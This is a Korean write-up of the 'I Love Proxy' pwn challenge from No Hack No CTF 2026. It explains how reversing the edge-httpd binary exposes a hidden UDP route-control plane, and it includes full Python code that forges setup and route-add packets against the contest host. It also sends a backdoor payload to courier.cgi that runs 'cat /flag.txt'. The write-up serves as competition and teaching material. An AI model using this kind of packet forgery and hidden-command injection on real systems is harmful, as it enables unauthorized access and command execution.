---
ctf_name: "No Hack No CTF 2026"
challenge_name: "I Love Proxy"
category: "pwn"
difficulty: "hard"
author: "oscarjhk"
date: "2026-07-05"
tags: ["Reverse Engineering", "HTTP", "UDP", "CGI", "Proxy"]
---

# I Love Proxy

## 문제 설명

> Proxy Proxy Proxy another proxy chall but it seems different

- 런처: `http://160.30.99.189:8100/`
- 런처에 CTFd team token을 넣으면 개인 인스턴스 포트가 하나 발급된다.
- 제공 파일: `docker-compose.yml`, `edge-httpd`, `courier.cgi`, `cgid`

처음 보면 HTTP 프록시 문제처럼 보이지만, 실제 핵심은 `edge-httpd`와 `courier.cgi` 두 개의 네이티브 바이너리를 역분석해 숨겨진 제어 평면과 내부 라우트를 복원하는 데 있다.

## 풀이

### 분석

`docker-compose.yml`을 보면 외부에 노출되는 서비스는 `edge` 하나뿐이다.
내부에는 `courier:7000`, `vault:80`, `ledger:80`, `render-cache:80`이 있고, `edge`는 다음 두 포트를 같은 `${PORT0}`로 바인딩한다.

```yaml
ports:
  - "${PORT0}:8080"
  - "${PORT0}:5555/udp"
```

즉 런처가 보여 주는 단일 포트 하나가 TCP 8080과 UDP 5555를 동시에 담당한다.
여기서 이미 “HTTP만 보는 문제는 아니겠구나”라는 힌트를 얻을 수 있다.

`edge-httpd`를 열어보면 `/healthz`, `/api/status`, `/api/routes`, `/debug/routes` 같은 문자열이 보이지만, 실제 HTTP로 접근하면 `/api/routes`와 `/debug/routes`는 쓰기 기능이 막혀 있고 `signed lease required` 같은 메시지만 돌려준다.

하지만 바이너리에는 별도로 UDP 스레드가 하나 더 있다.

- `main`에서 `HTTP_PORT`와 `UDP_PORT`를 읽은 뒤 HTTP accept loop와 별개로 UDP thread를 띄운다.
- UDP thread는 `recvfrom()`으로 패킷을 받고 내부 route table을 수정한다.
- route table은 `0x406220`부터 `0x20c` 크기 엔트리 0x30개로 유지된다.
- HTTP 요청 handler는 이 table을 조회해 외부 path를 내부 `host:port`로 프록시한다.

즉 HTTP로는 막아 둔 관리 기능이 UDP control plane으로는 그대로 살아 있다.

분석 중 핵심으로 확인한 패킷 타입은 두 개다.

1. setup packet
2. route-add packet

`setup`은 글로벌 토큰을 초기화하고, `route-add`는 그 토큰을 검증한 뒤 path -> upstream 매핑을 route table에 추가한다.

로컬에서 `ledger:80`으로 route를 추가했을 때 외부 `GET /zzztest`가 실제로 ledger의 `not found` 응답을 반환하는 것을 확인하면서 UDP 주입 경로가 맞다는 것을 검증했다.

다음 단계는 내부 `courier:7000`을 외부로 노출시키는 것이다.

한편 `courier.cgi`도 평범한 CGI가 아니다.
제공된 `solve.py`를 기준으로 역분석하면 다음 조건을 만족하는 비정상적인 POST body가 존재한다.

- 특정 header name hash를 만족하는 `ipcppln: raw`
- bucket `0x11`에 30개 이상의 header collision
- body 내부 여러 checksum / cookie / slot 검증
- 최종적으로 hidden command buffer에 `cat /flag.txt`가 들어가도록 인코딩

즉 최종 플래그 회수는 `edge-httpd` RCE가 아니라:

1. UDP로 외부 path를 `courier:7000`에 연결
2. 그 path로 `courier.cgi` hidden handler를 호출

이 두 단계를 결합하면 된다.

### 취약점

이 문제의 본질적인 취약점은 두 단계다.

첫 번째는 `edge-httpd`의 숨겨진 UDP control plane이다.
HTTP 인터페이스에서는 `/api/routes`가 봉인된 것처럼 보이지만, 같은 외부 포트의 UDP 서비스는 별도 인증 체계 없이 난독화된 패킷만 맞추면 route table을 수정할 수 있다.

패킷 구조는 다음과 같이 복원된다.

#### 1. setup packet

총 길이 14바이트:

```text
magic(4) | 0x03 | 0x36 | seed32(4) | checksum(4)
```

- `magic`은 `0x89543217`
- checksum은 `(seed32 ^ 0xa7) & 0xff`를 1바이트 seed로 넣는 32비트 mixer 결과
- 성공하면 이 `seed32`로부터 route-add에서 사용할 글로벌 token이 계산된다

#### 2. route-add packet

```text
magic(4) | 0x03 | 0x71 | flags(1) | seedkey(1)
| path_len(2) | upstream_len(2) | token(4)
| enc(path) | enc(upstream) | checksum(4)
```

- 여기서 `flags=0x22`가 필요했다
- `path`, `upstream`은 `(seedkey ^ 0xa7) & 0xff` 기반 XOR stream으로 인코딩된다
- `token`은 setup seed로부터 계산된 값과 일치해야 한다

두 번째는 `courier.cgi`에 숨겨진 명령 실행 경로다.
이 바이너리는 정상적인 HTTP/CGI 요청만 처리하는 것이 아니라, 특수한 header/body layout을 만족할 경우 내부 decode 루틴을 타고 command string을 복원한다.

이 문제에서 중요한 점은:

- `ipcppln: raw`가 맞는 special header라는 점
- `solve.py`가 이미 `courier.cgi`의 검증식을 모두 복원하고 있다는 점

따라서 굳이 다른 취약점을 추가로 만들 필요 없이, 내부 `courier`만 외부 path에 연결하면 `solve.py`의 payload를 그대로 재사용할 수 있다.

### 익스플로잇

전체 흐름은 아래와 같다.

1. 런처에 team token을 넣어 현재 인스턴스 포트를 확인한다.
2. 같은 포트의 UDP로 setup packet을 보낸다.
3. route-add packet으로 `/<chosen_path>`를 `courier:7000`에 매핑한다.
4. `solve.py`의 `build_body_and_meta()`를 사용해 `courier.cgi` 전용 POST 요청을 만든다.
5. `cat /flag.txt` 명령이 복원되도록 body를 구성해 외부 path로 전송한다.
6. 응답에서 플래그를 읽는다.

UDP 부분만 정리하면 다음과 같다.

```python
import socket
import struct

def rol32(x, n):
    return ((x << n) | (x >> (32 - n))) & 0xffffffff

def ror32(x, n):
    return ((x >> n) | (x << (32 - n))) & 0xffffffff

def mix(buf: bytes, seed: int) -> int:
    r11 = ((seed & 0xff) ^ len(buf) ^ 0x9e3779b9) & 0xffffffff
    edi = seed & 0xff
    r10 = seed & 0xff

    for i, b in enumerate(buf):
        edx = (b + (edi & 0xff)) & 0xffffffff
        rcx = (i ^ r10) & 3

        if rcx == 1:
            eax = (rol32((edx ^ 0x41) & 0xffffffff, (i & 7) + 3) + r11) & 0xffffffff
        elif rcx == 2:
            eax = (ror32((edx * 0x10101) & 0xffffffff, (i & 7) + 1) ^ r11) & 0xffffffff
        elif rcx == 0:
            eax = (((edx << ((i & 3) * 8)) & 0xffffffff) ^ r11) & 0xffffffff
        else:
            eax = (((r11 >> 11) ^ edx) + r11) & 0xffffffff

        eax = rol32(eax, 5)
        edi = (edi + 0x11) & 0xff
        eax = (eax * 0x045d9f3b) & 0xffffffff
        r11 = (eax + 0x27100001) & 0xffffffff

    return (r11 ^ 0xa5c31e2d) & 0xffffffff

def session_token(seed32: int) -> int:
    edx = (seed32 ^ 0x7f4a7c15) & 0xffffffff
    edx = (edx * 0x045d9f3b) & 0xffffffff
    edx = (edx + 0x27100001) & 0xffffffff
    edx = rol32(edx, ((seed32 & 0xff) & 7) + 5)

    eax = (seed32 - 0x5a3ce1d3) & 0xffffffff
    eax = ror32(eax, (((seed32 >> 8) & 0xff) & 7) + 3)

    return 0x31415927 if edx == eax else (edx ^ eax) & 0xffffffff

def enc(data: bytes, key: int) -> bytes:
    out = bytearray()
    v = 0x31
    for b in data:
        out.append(b ^ (v & 0xff) ^ (key & 0xff))
        v += 0x0d
    return bytes(out)

def build_setup(seed32: int) -> bytes:
    body = bytes([0x03, 0x36]) + struct.pack(">I", seed32)
    checksum = mix(body, (seed32 ^ 0xa7) & 0xff)
    return struct.pack(">I", 0x89543217) + body + struct.pack(">I", checksum)

def build_route(seedkey: int, path: bytes, upstream: bytes, token: int) -> bytes:
    key = (seedkey ^ 0xa7) & 0xff
    body = bytearray([0x03, 0x71, 0x22, seedkey])
    body += struct.pack(">H", len(path))
    body += struct.pack(">H", len(upstream))
    body += struct.pack(">I", token)
    body += enc(path, key)
    body += enc(upstream, key)
    checksum = mix(body, key)
    return struct.pack(">I", 0x89543217) + body + struct.pack(">I", checksum)

host = "160.30.99.189"
port = 30176
seed32 = 0x55667788
seedkey = 0x5a
path = b"/n3uyfaOR6"
upstream = b"courier:7000"

udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
udp.sendto(build_setup(seed32), (host, port))
udp.sendto(build_route(seedkey, path, upstream, session_token(seed32)), (host, port))
udp.close()
```

이제 `solve.py`의 `build_body_and_meta(command=b"cat /flag.txt")`를 이용해 `courier.cgi` payload를 만든 뒤, 그 결과로 나온 `meta["head"] + meta["body"]`를 그대로 TCP로 보내면 된다.

```python
import socket
import solve

host = "160.30.99.189"
port = 30176

meta = solve.build_body_and_meta(command=b"cat /flag.txt")

sock = socket.create_connection((host, port))
sock.sendall(meta["head"] + meta["body"])

out = b""
while True:
    chunk = sock.recv(4096)
    if not chunk:
        break
    out += chunk

print(out.decode("latin1", "replace"))
sock.close()
```

실제 응답은 다음처럼 바로 플래그를 돌려준다.

```text
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: ...
X-Node: r7

NHNC{...}
```

핵심은 `edge-httpd`를 굳이 메모리 손상으로 깨지 않아도 된다는 점이다.
문제에서 봉인된 것처럼 보이던 route 관리 기능을 UDP로 되살리고, 그 뒤에 숨겨진 `courier.cgi` backdoor payload를 그대로 실어 나르면 된다.

## 플래그

```text
NHNC{REDACTED}
```

## 배운 점

- HTTP에서 막힌 기능이 있다고 해서 같은 서비스의 다른 프로토콜 경로까지 막혔다고 가정하면 안 된다.
- stripped binary라도 문자열, table layout, checksum 루틴, 작은 state machine을 차근히 복원하면 숨겨진 control plane을 다시 만들 수 있다.
- 이번 문제는 “메모리 취약점이 보이더라도 실제 shortest path는 프로토콜 재구성일 수 있다”는 점을 잘 보여 줬다.
